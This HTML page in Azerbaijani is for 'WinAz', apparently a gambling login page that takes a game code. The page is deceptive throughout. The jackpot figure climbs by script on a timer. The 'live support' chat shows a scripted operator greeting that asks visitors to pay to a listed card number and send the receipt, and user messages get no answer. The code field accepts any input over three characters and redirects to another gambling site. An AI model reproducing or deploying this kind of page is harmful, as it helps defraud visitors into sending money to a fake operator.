<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>WinAz - Canlı Giriş</title>

<style>
*{box-sizing:border-box;margin:0;padding:0}

body{
  background:#000;
  color:#fff;
  font-family:'Segoe UI',Tahoma,sans-serif;
  overflow-x:hidden;
  display:flex;
  flex-direction:column;
  align-items:center;
}

/* JACKPOT */
#jackpotCont{
  width:100%;
  text-align:center;
  padding:20px 0;
}
.jackpot-box{
  display:inline-block;
  padding:10px 30px;
  border-radius:50px;
  border:2px solid #ffd700;
  background:rgba(255,215,0,.1);
  box-shadow:0 0 20px #ffd700;
}
.jack-amt{
  font-size:35px;
  font-weight:900;
  text-shadow:0 0 10px #ffd700;
}

/* LOGO */
.neon-logo{
  font-size:80px;
  font-weight:900;
  letter-spacing:10px;
  margin-bottom:10px;
  animation:neon 1.5s infinite alternate;
  text-align:center;
}
@keyframes neon{
  from{color:#fff;text-shadow:0 0 10px #fff,0 0 20px #ffd700}
  to{color:#ffd700;text-shadow:0 0 30px #ff8c00}
}

/* FORM WRAPPER */
#codeFormWr{
  background:url("online555logo.png") no-repeat center top;
  background-size:contain;
  width:1108px;
  height:600px;
  position:relative;
  margin-top:20px;
}

/* FORM PANEL */
#codeFormCont{
  background:url("login-panel-back.png") no-repeat;
  width:678px;
  height:152px;
  position:absolute;
  left:50%;
  bottom:200px;
  margin-left:-339px;
}
#codeFldLbl{
  position:absolute;
  left:60px;
  top:60px;
  font:bold 22px Tahoma;
}
#codeFld{
  background:url("code-field-back.png") no-repeat;
  border:none;
  outline:none;
  height:34px;
  width:284px;
  position:absolute;
  right:140px;
  top:54px;
  text-align:center;
  font-size:22px;
  font-weight:bold;
}
#btnOk{
  background:url("log-btn.png") no-repeat;
  border:none;
  width:83px;
  height:50px;
  position:absolute;
  right:50px;
  top:53px;
  cursor:pointer;
  color:transparent;
}

/* INFO */
.info-box{
  position:absolute;
  bottom:20px;
  width:100%;
  text-align:center;
}
.info-p{
  font:20px Tahoma;
  color:#ccc;
  max-width:80%;
  margin:0 auto;
}

/* LIVE SUPPORT BUTTON */
#liveSupport{
  position:fixed;
  bottom:30px;
  right:30px;
  width:80px;
  height:80px;
  border-radius:50%;
  background:radial-gradient(circle,#ffd700,#ff8c00);
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  animation:pulse 1.5s infinite;
  z-index:1000;
  box-shadow:0 0 20px rgba(255,215,0,.6);
}
@keyframes pulse{
  0%{transform:scale(1)}
  50%{transform:scale(1.1)}
  100%{transform:scale(1)}
}
.support-label{
  position:absolute;
  right:90px;
  background:#fff;
  color:#000;
  padding:8px 14px;
  border-radius:10px;
  font-weight:bold;
  font-size:13px;
  white-space:nowrap;
}

/* CHAT */
#chatBox{
  position:fixed;
  bottom:120px;
  right:30px;
  width:320px;
  background:#fff;
  border-radius:15px;
  border:3px solid #ffd700;
  display:none;
  flex-direction:column;
  z-index:1001;
  overflow:hidden;
}
#chatHeader{
  background:#ffd700;
  color:#000;
  padding:12px;
  font-weight:bold;
  display:flex;
  justify-content:space-between;
}
#chatMessages{
  flex:1;
  padding:10px;
  overflow-y:auto;
  font-size:14px;
  color:#000;
  background:#f7f7f7;
}
.msg{margin:6px 0}
.msg.op{color:#333}
.msg.user{text-align:right;color:#000}
#chatInput{
  display:flex;
  border-top:1px solid #ddd;
}
#chatInput input{
  flex:1;
  border:none;
  padding:10px;
  font-size:14px;
  outline:none;
}
#chatInput button{
  background:#ffd700;
  border:none;
  padding:10px 15px;
  font-weight:bold;
  cursor:pointer;
}

/* =======================
   MOBILE FIX (NO FLY UP)
======================= */
@media(max-width:768px){
  .neon-logo{
    font-size:42px;
    letter-spacing:4px;
    margin:12px 0;
  }

  /* ƏSAS HƏLL */
  #codeFormWr{
    transform:scale(0.36);
    transform-origin:top center;
    margin-top:0;          /* mənfi margin YOX */
    padding-bottom:260px;  /* aşağıdan balans */
  }

  .jack-amt{font-size:26px}

  #liveSupport{
    width:60px;
    height:60px;
    bottom:20px;
    right:20px;
  }
  .support-label{display:none}

  #chatBox{
    width:90vw;
    right:5vw;
    bottom:100px;
  }
}

@media(max-width:420px){
  #codeFormWr{
    transform:scale(0.30);
    padding-bottom:300px;
  }
  .neon-logo{font-size:36px}
}
</style>
</head>

<body>

<div id="jackpotCont">
  <div class="jackpot-box">
    <div class="jack-amt">₼ <span id="val">150.00</span></div>
  </div>
</div>

<h1 class="neon-logo">WinAz</h1>

<div id="codeFormWr">
  <form id="codeFormCont" onsubmit="return false;">
    <label id="codeFldLbl">EnterCode:</label>
    <input id="codeFld" autocomplete="off">
    <button id="btnOk" type="button" onclick="checkCode()">Ok</button>
  </form>

  <div class="info-box">
    <p class="info-p">
      Ödəniş edib qəbzi canlı dəstəyə göndərin və oyun kodunu əldə edin
    </p>
  </div>
</div>

<div id="liveSupport" onclick="toggleChat()">
  <div class="support-label">Canlı Dəstək</div>
</div>

<div id="chatBox">
  <div id="chatHeader">
    <span>WinAz Dəstək</span>
    <span style="cursor:pointer" onclick="toggleChat()">✕</span>
  </div>
  <div id="chatMessages"></div>
  <div id="chatInput">
    <input type="text" id="msgText" placeholder="Mesajınızı yazın...">
    <button onclick="sendMsg()">Göndər</button>
  </div>
</div>

<script>
/* JACKPOT */
let start=150;
setInterval(()=>{
  if(start<450){
    start+=Math.random()*0.1;
    document.getElementById("val").innerText=start.toFixed(2);
  }
},150);

/* CHAT */
let operatorSent=false;
function toggleChat(){
  const chat=document.getElementById("chatBox");
  chat.style.display = (chat.style.display==="flex") ? "none" : "flex";

  if(chat.style.display==="flex" && !operatorSent){
    operatorSent=true;
    setTimeout(()=>{
      document.getElementById("chatMessages").innerHTML+=`
      <div class="msg op">
        <b>Operator:</b> Salam, WinAz sizi salamlayır. Ödəniş edib qəbzi göndərin, kodu əldə edin.<br>
        <b>Kart:</b> 4169 7388 0000 0000
      </div>`;
    },300);
  }
}
function sendMsg(){
  const input=document.getElementById("msgText");
  const text=input.value.trim();
  if(!text) return;
  const box=document.getElementById("chatMessages");
  box.innerHTML+=`<div class="msg user"><b>Siz:</b> ${text}</div>`;
  input.value="";
  box.scrollTop=box.scrollHeight;
}

/* CODE CHECK */
function checkCode(){
  const code=document.getElementById("codeFld").value;
  if(code.length>3){
    window.location.href="https://fastloto365.com";
  }else{
    alert("Lütfən düzgün kodu daxil edin");
  }
}
</script>

</body>
</html>
